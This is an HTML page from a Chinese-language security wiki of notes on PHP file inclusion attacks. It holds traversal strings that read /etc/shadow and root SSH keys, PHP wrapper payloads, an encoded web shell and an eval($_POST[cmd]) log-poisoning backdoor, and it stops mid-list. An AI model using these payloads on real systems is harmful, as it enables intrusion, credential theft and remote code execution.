<!DOCTYPE HTML>
<html>
    <head>
        <link rel="Stylesheet" type="text/css" href="/static/css/style.css">
        <link rel="Stylesheet" type="text/css" href="/static/css/tango.css">
        <title>php 文件包含 - Wiki | janes</title>
        <meta name="keywords" content=""/>
        <meta name="description" content=""/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    </head>

    <body>
        <div id="container">
            
<div id="header">
  <div id="post-nav"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/#WebSecurity">WebSecurity</a>&nbsp;»&nbsp;php 文件包含</div>
</div>
<div class="clearfix"></div>
<div id="title">php 文件包含</div>
  <div id="content">
  <h2 id="0x01">0x01 与文件包含相关的函数</h2>
<div class="hlcode"><pre><span class="n">require</span>         <span class="err">找不到被包含的文件时会产生致命错误，并停止脚本运行。</span>
<span class="n">include</span>         <span class="err">找不到被包含的文件时只会产生警告，脚本将继续运行。</span>
<span class="n">include_once</span>    <span class="err">与</span><span class="n">include</span><span class="err">类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span>
<span class="n">require_once</span>    <span class="err">与</span><span class="n">require</span><span class="err">类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</span>
</pre></div>


<h2 id="0x02-lfi-local-file-include">0x02 本地文件包含(LFI--Local File Include)</h2>
<h3 id="_1">普通本地包含</h3>
<p>只要网站支持上传，上传任意后缀文件，被包含的文件中含有效的php代码，则引入当前文件执行，若不含有效php代码，则直接输出文件内容</p>
<p>样例：</p>
<div class="hlcode"><pre><span class="err">#</span> <span class="nx">lfi</span><span class="p">.</span><span class="nx">php</span>
<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</pre></div>


<p><strong> 利用 </strong></p>
<h4 id="php">注入有效 php 代码</h4>
<div class="hlcode"><pre><span class="nx">echo</span> <span class="err">&quot;</span><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="s2">&quot; &gt;&gt; lfi.txt</span>

<span class="s2"># browser</span>
<span class="s2">http://127.0.0.1/lfi.php?file=lfi.txt</span>
</pre></div>


<h4 id="_2">目录遍历</h4>
<div class="hlcode"><pre><span class="cp"># linux 这两个文件存储着所有文件的路径，需要root权限</span>
<span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">mlocate</span><span class="o">/</span><span class="n">mlocate</span><span class="p">.</span><span class="n">db</span>
<span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">locate</span><span class="p">.</span><span class="n">db</span>
</pre></div>


<h4 id="_3">包含错误日志</h4>
<div class="hlcode"><pre><span class="o">?</span><span class="n">ile</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
</pre></div>


<h4 id="web">获取web目录或配置文件</h4>
<div class="hlcode"><pre><span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
</pre></div>


<h4 id="_4">包含上传附件</h4>
<div class="hlcode"><pre><span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="n">attachment</span><span class="o">/</span><span class="n">media</span><span class="o">/</span><span class="n">xx</span><span class="p">.</span><span class="n">file</span>
</pre></div>


<h4 id="session">读取 session 文件</h4>
<div class="hlcode"><pre><span class="o">?</span><span class="n">file</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sess_xxxxx</span>
</pre></div>


<p>session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell</p>
<h4 id="root">如果拥有root权限还可以试试读这些东西：</h4>
<div class="hlcode"><pre><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span>

<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span>

<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="p">.</span><span class="n">keystore</span>

<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span><span class="p">.</span><span class="n">pub</span>

<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">known_hosts</span>

<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span>

<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">bash_history</span>

<span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">mysql_history</span>

<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">fd</span><span class="o">/</span><span class="n">fd</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">*</span> <span class="p">(</span><span class="err">文件标识符</span><span class="p">)</span>

<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">mounts</span>

<span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">config</span><span class="p">.</span><span class="n">gz</span>
</pre></div>


<h3 id="_5">截断本地包含</h3>
<p>样例：</p>
<div class="hlcode"><pre><span class="n">include</span><span class="p">(</span><span class="err">$</span><span class="n">a</span><span class="p">.</span><span class="s">&quot;.php&quot;</span><span class="p">);</span>
</pre></div>


<ul>
<li>长文件名截断</li>
</ul>
<p>php版本小于5.2.8(?)可以成功</p>
<p>windows和linux的文件名长度是有限制的，超过其长度的会被忽略，通常情况下windows的截断长度为260，linux的长度为4096，这一不用在意具体长度，只要把需要截断的字符串挤到后面就可以了</p>
<p>样例：</p>
<div class="hlcode"><pre><span class="cp">&lt;?php</span>  <span class="k">include_once</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span>  

<span class="err">#</span> <span class="nx">POC</span>
<span class="nx">http</span><span class="o">:</span><span class="c1">//127.0.0.1/test/123.php?f=test.txt/././....../</span>
</pre></div>


<p>实例：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2011-02236">长文件名截断: 济南大学主站本地文件包含导致代码执行</a></p>
<p>1windows</p>
<p>windows在文件名后加/.  或 .都是可以的</p>
<div class="hlcode"><pre><span class="err">\</span><span class="p">.</span>
<span class="p">.</span><span class="o">/</span>
<span class="o">/</span>
\
</pre></div>


<p>2linux</p>
<div class="hlcode"><pre><span class="p">.</span><span class="o">/</span>
<span class="o">/</span>
</pre></div>


<ul>
<li>点号截断：</li>
</ul>
<p>?file=../../../../../../../../../boot.ini/......</p>
<p>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
<ul>
<li>%00 截断包含</li>
</ul>
<blockquote>
<p>gpc=off 和 php 版本限制</p>
</blockquote>
<h2 id="0x03">0x03 远程包含</h2>
<p>allow_url_include=On 就是远程文件包含，Off就是本地文件包含</p>
<blockquote>
<p>“zlib://”和“ogg://”等方式绕过 远程文件包含(RFI)</p>
</blockquote>
<h2 id="0x04-php">0x04 php 自带协议</h2>
<h3 id="data"><strong> data:// </strong></h3>
<p>Streams can be used with functions such as file_get_contents, fopen, include and require etc. and this is where the danger of Remote and Local file inclusion occur</p>
<blockquote>
<p>php&gt;5.2, allow_url_include=On</p>
</blockquote>
<div class="hlcode"><pre><span class="err">#</span> <span class="nt">base64</span> <span class="nt">decode</span> <span class="nt">is</span> <span class="s1">&#39;I love PHP\n&#39;</span>
<span class="nt">echo</span> <span class="nt">file_get_contents</span><span class="o">(</span><span class="s1">&#39;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#39;</span><span class="o">);</span>

<span class="err">#</span> <span class="nt">index</span><span class="nc">.php</span>
<span class="o">&lt;?</span> <span class="nt">include</span><span class="o">(</span><span class="err">$</span><span class="nt">_GET</span><span class="cp">[</span><span class="s1">&#39;file&#39;</span><span class="cp">]</span> <span class="o">.</span> <span class="s2">&quot;.php&quot;</span><span class="o">);</span>

<span class="err">#</span> <span class="nt">phpinfo</span>
<span class="o">&lt;?</span> <span class="nt">phpinfo</span><span class="o">();</span> <span class="nt">die</span><span class="o">();?&gt;</span>

<span class="o">::</span><span class="nd">:php</span>
<span class="o">//</span> <span class="nt">Base64</span> <span class="nt">Encoded</span>
<span class="nt">PD8gcGhwaW5mbygpOyBkaWUoKTs</span><span class="o">/</span><span class="nt">Pg</span><span class="o">==</span>

<span class="o">//</span> <span class="nt">URL</span> <span class="o">+</span> <span class="nt">Base64</span> <span class="nt">Encoded</span>
<span class="nt">PD8gcGhwaW5mbygpOyBkaWUoKTs</span><span class="o">%</span><span class="nt">2fPg</span><span class="o">==</span>

<span class="o">//</span> <span class="nt">Final</span> <span class="nt">URL</span>
<span class="nt">index</span><span class="nc">.php</span><span class="o">?</span><span class="nt">file</span><span class="o">=</span><span class="nt">data</span><span class="o">://</span><span class="nt">text</span><span class="o">/</span><span class="nt">plain</span><span class="o">;</span><span class="nt">base64</span><span class="o">,</span><span class="nt">PD8gcGhwaW5mbygpOyBkaWUoKTs</span><span class="o">%</span><span class="nt">2fPg</span><span class="o">==</span>
</pre></div>


<p>gui command shell:</p>
<div class="hlcode"><pre><span class="err">#</span> <span class="nx">GUI</span> <span class="nb">command</span> <span class="nx">shell.</span>

<span class="err">#</span> <span class="nx">PHP</span> <span class="nb">Payload</span>
<span class="o">&lt;</span><span class="nb">form</span> <span class="n">action</span><span class="o">=</span><span class="s2">&quot;&lt;?=$_SERVER[&#39;REQUEST_URI&#39;]?&gt;&quot;</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="o">&gt;&lt;</span><span class="nb">input</span> <span class="k">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;x&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;&lt;?=htmlentities($_POST[&#39;x&#39;])?&gt;&quot;</span><span class="o">&gt;&lt;</span><span class="nb">input</span> <span class="k">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;cmd&quot;</span><span class="o">&gt;&lt;/</span><span class="nb">form</span><span class="o">&gt;&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;?</span> <span class="nx">echo</span> <span class="sb">`{$_POST[&#39;x&#39;]}`</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="nt">&lt;/pre&gt;</span><span class="cp">&lt;? die(); ?&gt;</span>

# Base64 encoded payload

PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8+IiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT8+Ij48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0+PHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8+PC9wcmU+PD8gZGllKCk7ID8+Cgo=

# Base64 + URL encoded payload
PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4IiB2YWx1ZT0iPD89aHRtbGVudGl0aWVzKCRfUE9TVFsneCddKT82BIj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2BPHByZT48PyAKZWNobyBgeyRfUE9TVFsneCddfWA7ID8%2BPC9wcmU%2BPD8gZGllKCk7ID8%2BCgo%3D
</pre></div>


<h3 id="phpinput-"><strong> php://input </strong> --</h3>
<p>可以访问请求的原始数据的只读流(这个原始数据指的是POST数据)</p>
<blockquote>
<p>php5.0以下 和 php5.2 版本有效, allow_url_include=On</p>
</blockquote>
<p>LFI 导致 code excute</p>
<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span> 
<span class="err">　　</span><span class="k">@eval</span><span class="o">(</span><span class="nt">file_get_contents</span><span class="o">(</span><span class="s1">&#39;php://input&#39;</span><span class="o">))</span>
<span class="o">?&gt;</span> 
<span class="nt">http</span><span class="o">://</span><span class="nt">localhost</span><span class="o">/</span><span class="nt">test</span><span class="o">/</span><span class="nt">index</span><span class="nc">.php</span>
<span class="nt">post</span><span class="o">:</span> <span class="nt">system</span><span class="o">(</span><span class="s2">&quot;dir&quot;</span><span class="o">)</span><span class="p">;</span>
<span class="nt">result</span><span class="o">:</span> <span class="nt">list</span> <span class="nt">directory</span>
</pre></div>


<p>这本质上远程文件包含的利用，远程文件包含中的include接收的是一个"资源定位符"，在大多数情况下这是一个磁盘文件路径，但是从流的角度来看，这也可以是一个流资源定位符，即我们将include待包含的资源又重定向到了输入流中，从而可以输入我们的任意code到include中</p>
<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span>
<span class="err">　　</span><span class="k">@include</span><span class="o">(</span><span class="err">$</span><span class="nt">_GET</span><span class="cp">[</span><span class="s2">&quot;file&quot;</span><span class="cp">]</span><span class="o">)</span><span class="p">;</span>
<span class="o">?&gt;</span>
<span class="nt">http</span><span class="o">://</span><span class="nt">localhost</span><span class="o">/</span><span class="nt">test</span><span class="o">/</span><span class="nt">index</span><span class="nc">.php</span><span class="o">?</span><span class="nt">file</span><span class="o">=</span><span class="nt">php</span><span class="o">://</span><span class="nt">input</span>
<span class="nt">post</span><span class="o">:</span> <span class="o">&lt;?</span><span class="nt">php</span> <span class="nt">system</span><span class="o">(</span><span class="s1">&#39;ipconfig&#39;</span><span class="o">);?&gt;</span>
<span class="nt">result</span><span class="o">:</span> <span class="nt">ip</span> <span class="nt">information</span>
</pre></div>


<p>有一点要注意:</p>
<div class="hlcode"><pre><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;solution.php&quot;</span><span class="p">);</span><span class="cp">?&gt;</span>
</pre></div>


<p>在利用文件包含进行代码执行的时候，我们通过file_get_contents获取到的文件内容，如果是一个.php文件，会被当作include的输入参数，也就意味着会被再执行一次，则我们无法看到原始代码了</p>
<p>解决这个问题的方法就是使用base64_encode进行编码</p>
<div class="hlcode"><pre><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;solution.php&quot;</span><span class="p">));</span><span class="cp">?&gt;</span>
</pre></div>


<h3 id="phpfilter-resourcevonvertphp"><strong> php://filter </strong>-- 利用主要是利用了resource和vonvert，这样可以读取到php的代码。</h3>
<blockquote>
<p>php5.0以上</p>
</blockquote>
<div class="hlcode"><pre><span class="o">?</span><span class="n">url</span><span class="o">=</span><span class="n">php</span><span class="o">:</span><span class="c1">//filter/convert.base64-encode/resource=test.txt </span>

<span class="o">?</span><span class="n">url</span><span class="o">=</span><span class="n">php</span><span class="o">:</span><span class="c1">//filter/convert.base64-encode/resource=http://127.0.0.1/test/test.txt</span>
</pre></div>


<p>实战：</p>
<div class="hlcode"><pre><span class="err">$</span> <span class="n">curl</span> <span class="n">ctf</span><span class="p">.</span><span class="n">sharif</span><span class="p">.</span><span class="n">edu</span><span class="o">:</span><span class="mi">31455</span><span class="o">/</span><span class="n">chal</span><span class="o">/</span><span class="n">technews</span><span class="o">/</span><span class="mi">634770</span><span class="n">c075a17b83</span><span class="o">/</span><span class="n">images</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="n">php</span><span class="o">:</span><span class="c1">//filter/resource=files/images/robot.jpg/resource=files/flag/flag.txt</span>
</pre></div>


<p>向磁盘写文件</p>
<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span>
<span class="err">　　</span><span class="c">/* 这会通过 rot13 过滤器筛选出字符 &quot;Hello World&quot;</span>
<span class="c">　　然后写入当前目录下的 example.txt */</span>
<span class="err">　　</span><span class="nt">file_put_contents</span><span class="o">(</span><span class="s2">&quot;php://filter/write=string.rot13/resource=example.txt&quot;</span><span class="o">,</span><span class="s2">&quot;Hello World&quot;</span><span class="o">);</span>
<span class="o">?&gt;</span>
</pre></div>


<p>这个参数采用一个或以管道符 | 分隔的多个过滤器名称</p>
<h3 id="phpfd"><strong> php://fd </strong></h3>
<blockquote>
<p>php 5.3.6中新增加</p>
</blockquote>
<h3 id="zip">zip://</h3>
<blockquote>
<p>allow_url_fopen=no</p>
</blockquote>
<div class="hlcode"><pre><span class="cp"># zip 内含目录</span>
<span class="nl">zip:</span><span class="c1">//archive.zip#dir/file.txt </span>

<span class="cp"># url 中使用 &quot;%23&quot;(#)</span>
<span class="o">?</span><span class="n">f</span><span class="o">=</span><span class="n">zip</span><span class="o">:</span><span class="c1">//path_to_zip%23inside_file_name</span>
</pre></div>


<p>文件压缩成zip包，压缩的时候注意要选择only store之类的选项，防止数据被压缩</p>
<div class="hlcode"><pre><span class="n">zip</span> <span class="o">-</span><span class="mi">0</span> <span class="mf">1.</span><span class="n">zip</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span>
</pre></div>


<p><strong> 额外支持 </strong></p>
<div class="hlcode"><pre><span class="n">fopen</span><span class="p">(</span><span class="err">&#39;</span><span class="n">zip</span><span class="o">:</span><span class="c1">//path/xx.zip#inside_file_name&#39;)</span>
<span class="n">file_get_contents</span><span class="p">()</span>
<span class="n">imagecreatefromgif</span><span class="p">()</span>
</pre></div>


<h3 id="phar">phar://</h3>
<div class="hlcode"><pre><span class="o">?</span><span class="n">f</span><span class="o">=</span><span class="n">phar</span><span class="o">:</span><span class="c1">//php.zip/php.jpg</span>
</pre></div>


<p>与zip协议区别就是 phar 是用/来分隔而不是 #</p>
<ul>
<li><strong> glob </strong></li>
</ul>
<blockquote>
<p>php&gt;5.3.0</p>
</blockquote>
<div class="hlcode"><pre><span class="n">DirectoryIterator</span><span class="p">(</span><span class="err">“</span><span class="n">glob</span><span class="o">:</span><span class="c1">//ext/spl/examples/*.php”)</span>
</pre></div>


<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span>
<span class="err">　　</span><span class="o">//</span> <span class="err">循环</span> <span class="nt">ext</span><span class="o">/</span><span class="nt">spl</span><span class="o">/</span><span class="nt">examples</span><span class="o">/</span> <span class="err">目录里所有</span> <span class="o">*</span><span class="nc">.php</span> <span class="err">文件</span>
<span class="err">　　</span><span class="o">//</span> <span class="err">并打印文件名和文件尺寸</span>
<span class="err">　　$</span><span class="nt">it</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">DirectoryIterator</span><span class="o">(</span><span class="s2">&quot;glob://E:\\wamp\\www\\test\\*.php&quot;</span><span class="o">);</span>
<span class="err">　　</span><span class="nt">foreach</span><span class="o">(</span><span class="err">$</span><span class="nt">it</span> <span class="nt">as</span> <span class="err">$</span><span class="nt">f</span><span class="o">)</span> 
<span class="err">　　</span><span class="p">{</span>
<span class="err">　　　　</span><span class="n">printf</span><span class="p">(</span><span class="s2">&quot;%s: %.1FK\n&quot;</span><span class="o">,</span> <span class="err">$</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">getFilename</span><span class="p">()</span><span class="o">,</span> <span class="err">$</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">getSize</span><span class="p">()</span><span class="o">/</span><span class="m">1024</span><span class="p">);</span>
<span class="err">　　</span><span class="p">}</span>
<span class="o">?&gt;</span>
</pre></div>


<h3 id="file">file://</h3>
<p>越权访问本地文件</p>
<p>file:// — 访问本地文件系统; 文件系统是PHP使用的默认封装协议，展现了本地文件系统</p>
<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span>
<span class="err">　　$</span><span class="nt">res</span> <span class="o">=</span> <span class="nt">file_get_contents</span><span class="o">(</span><span class="s2">&quot;file://E://wamp//www//test//solution.php&quot;</span><span class="o">);</span>
<span class="err">　　</span><span class="nt">var_dump</span><span class="o">(</span><span class="err">$</span><span class="nt">res</span><span class="o">);</span>
<span class="o">?&gt;</span>
</pre></div>


<p>file://这个伪协议可以展示"本地文件系统"，当存在某个用户可控制、并得以访问执行的输入点时，我们可以尝试输入file://去试图获取本地磁盘文件</p>
<p>http://www.wechall.net/challenge/crappyshare/index.php</p>
<p>http://www.wechall.net/challenge/crappyshare/crappyshare.php</p>
<p>在这题CTF中，攻击的关键点在于：curl_exec($ch)</p>
<div class="hlcode"><pre><span class="kd">function</span> <span class="nx">upload_please_by_url</span><span class="p">(</span><span class="nx">$url</span><span class="p">)</span>
<span class="p">{</span> 
<span class="err">　　</span><span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">===</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;#^</span><span class="cp">[</span><span class="nx">a</span><span class="na">-z</span><span class="cp">]</span><span class="s1">{3,5}://#&#39;</span><span class="p">,</span> <span class="nx">$url</span><span class="p">))</span> <span class="err">#</span> <span class="nx">Is</span> <span class="nx">URL</span><span class="o">?</span> 
<span class="err">　　</span><span class="p">{</span>
<span class="err">　　　　</span><span class="nx">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nx">$url</span><span class="p">);</span>
<span class="err">　　　　</span><span class="nx">curl_setopt</span><span class="p">(</span><span class="nx">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="err">　　　　</span><span class="nx">curl_setopt</span><span class="p">(</span><span class="nx">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="err">　　　　</span><span class="nx">curl_setopt</span><span class="p">(</span><span class="nx">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_FAILONERROR</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="err">　　　　</span><span class="k">if</span> <span class="p">(</span><span class="kc">false</span> <span class="o">===</span> <span class="p">(</span><span class="nx">$file_data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nx">$ch</span><span class="p">)))</span>
<span class="err">　　　　</span><span class="p">{</span>
<span class="err">　　　　　　</span><span class="nx">htmlDisplayError</span><span class="p">(</span><span class="s1">&#39;cURL failed.&#39;</span><span class="p">);</span>
<span class="err">　　　　</span><span class="p">}</span>
<span class="err">　　　　</span><span class="k">else</span>
<span class="err">　　　　</span><span class="p">{</span>
<span class="err">　　　　　　</span><span class="c1">// Thanks</span>
<span class="err">　　　　　　</span><span class="nx">upload_please_thx</span><span class="p">(</span><span class="nx">$file_data</span><span class="p">);</span>
<span class="err">　　　　</span><span class="p">}</span>
<span class="err">　　</span><span class="p">}</span>
<span class="err">　　</span><span class="k">else</span>
<span class="err">　　</span><span class="p">{</span>
<span class="err">　　　　</span><span class="nx">htmlDisplayError</span><span class="p">(</span><span class="s1">&#39;Your URL looks errorneous.&#39;</span><span class="p">);</span>
<span class="err">　　</span><span class="p">}</span>
<span class="p">}</span>
</pre></div>


<p>当我们输入的file://参数被带入curl中执行时，原本的远程URL访问会被重定向到本地磁盘上，从而达到越权访问文件的目的</p>
<h2 id="0x04-session">0x04 包含Session文件</h2>
<p>包含Session文件的条件也较为苛刻，它需要攻击者能够"控制"部分Session文件的内容。</p>
<div class="hlcode"><pre><span class="nt">x</span><span class="o">|</span><span class="nt">s</span><span class="nd">:19</span><span class="o">:</span><span class="s2">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>
</pre></div>


<p>PHP默认生成的Session文件往往存放在/tmp目录下</p>
<div class="hlcode"><pre><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sess_SESSIONID</span>
</pre></div>


<h2 id="0x05-procselfenviron">0x05 包含/proc/self/environ文件</h2>
<p>包含/proc/self/environ是一种更通用的方法，因为它根本不需要猜测包包含文件的路径，同时用户也能控制它的内容</p>
<div class="hlcode"><pre><span class="nl">http:</span><span class="c1">//192.168.159.128/index.php?file=../../../../../../../proc/self/environ</span>
</pre></div>


<h2 id="0x06">0x06 日记包含高级利用</h2>
<p><a href="http://www.wooyun.org/bugs/wooyun-2011-02236">济南大学主站本地文件包含导致代码执行</a></p>
<p>限制</p>
<blockquote>
<p>类似http://www.exp.com/index&lt;?php eval($_POST[cmd]);?&gt;.php 
这样的提交，某些WEB服务器将会把空格做HTTP编码转成%20写入web日志,如果PHP包含&lt;?php%20eval($_POST[cmd]);?&gt;这样的语句肯定是不会成功的，所以我们必须把空格真正的写入WEB日志.</p>
</blockquote>
<p>突破</p>
<div class="hlcode"><pre><span class="cp">&lt;?</span><span class="cm">/**/</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">cmd</span><span class="p">]);</span><span class="cm">/**/</span><span class="cp">?&gt;</span>
</pre></div>


<p>1.short_open_tag=on
这类情况写入web日志，只能在short_open_tag=on的情况下才能有效，当short_open_tag=off时，PHP将不支持&lt;?/<strong>/eval($_POST[cmd]);/</strong>/?&gt;这样的短语句</p>
<p>2.WEB服务器一个奇怪的特性</p>
<p>如果没有返回响应而WEB服务器又接受了请求，那么请求的内容将原封不动的写入WEB日志，不会进行HTTP编码.</p>
<p>这样我们想个办法一直与WEB服务器保持TCP连接，不让WEB服务器处理响应返回，然后再由客户端的我们中断这次TCP连接，说得这么复杂其实很容易实现.只要在HTTP请求的数据包中去掉Connection HTTP标头值。</p>
<p>利用NC伪造没有Connection HTTP标头的请求包：</p>
<div class="hlcode"><pre><span class="n">GET</span> <span class="o">/</span><span class="n">index</span><span class="o">&lt;</span> <span class="o">&gt;</span><span class="p">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nl">Accept:</span> <span class="err">*/</span><span class="o">*</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="o">:</span> <span class="n">zh</span><span class="o">-</span><span class="n">cn</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">4.0</span> <span class="p">(</span><span class="n">compatible</span><span class="p">;</span> <span class="n">MSIE</span> <span class="mf">6.0</span><span class="p">;</span> <span class="n">Windows</span> <span class="n">NT</span> <span class="mf">5.1</span><span class="p">;</span> <span class="n">SV1</span><span class="p">;</span> <span class="p">.</span><span class="n">NET</span> <span class="n">CLR</span> <span class="mf">2.0.50727</span><span class="p">)</span>
<span class="nl">Host:</span> <span class="mf">192.168.3.44</span>
</pre></div>


<p>你会发现WEB服务器一直不会返回响应，直到我们客户端断开这次连接，这个邪恶的空格便写入了WEB日志！</p>
<ul>
<li>conf file paths targeted by LFI</li>
</ul>
<div class="hlcode"><pre><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
</pre></div>


<ul>
<li>Popular log file paths targeted by LFI</li>
</ul>
<div class="hlcode"><pre><span class="cp">../apache/logs/error.log</span>
<span class="cp">../apache/logs/access.log</span>
<span class="cp">../../apache/logs/error.log</span>
<span class="cp">../../apache/logs/access.log</span>
